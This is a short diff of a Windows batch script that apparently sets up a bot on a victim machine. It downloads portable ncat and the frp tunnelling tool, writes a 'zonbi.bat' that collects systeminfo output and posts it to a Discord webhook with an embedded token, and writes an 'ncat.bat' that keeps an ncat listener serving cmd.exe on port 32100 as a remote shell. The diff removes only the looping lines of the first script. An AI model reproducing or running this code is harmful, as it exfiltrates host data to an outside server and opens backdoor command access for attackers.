@@ -7,11 +7,9 @@ curl -O https://nmap.org/dist/ncat-portable-5.59BETA1.zip
 curl -O https://github.com/fatedier/frp/releases/download/v0.52.1/frp_0.52.1_windows_amd64.zip
 tar -xf ncat-portable-5.59BETA1.zip
 tar -xf frp_0.52.1_windows_amd64.zip
-echo :start >> %homedrive%\Akuma\zonbi.bat
 echo del %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
 echo systeminfo ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
 echo curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%homedrive%\Akuma\systeminfo.txt" -F "content=bot" https://discord.com/api/webhooks/1163478530538082437/riroyuxV8prESa8RqsYDxyLGPqksgCDMyGMwvuNxOyXkC8fzIgkvvpCUdzMU6Xlgj6Ht >> %homedrive%\Akuma\zonbi.bat
-echo goto start >> %homedrive%\Akuma\zonbi.bat
 echo :start >> %homedrive%\Akuma\ncat.bat
 echo %homedrive%\Akuma\ncat-portable-5.59BETA1\ncat.exe -lvp 32100 -e cmd.exe >> %homedrive%\Akuma\ncat.bat
 echo goto start >> %homedrive%\Akuma\ncat.bat
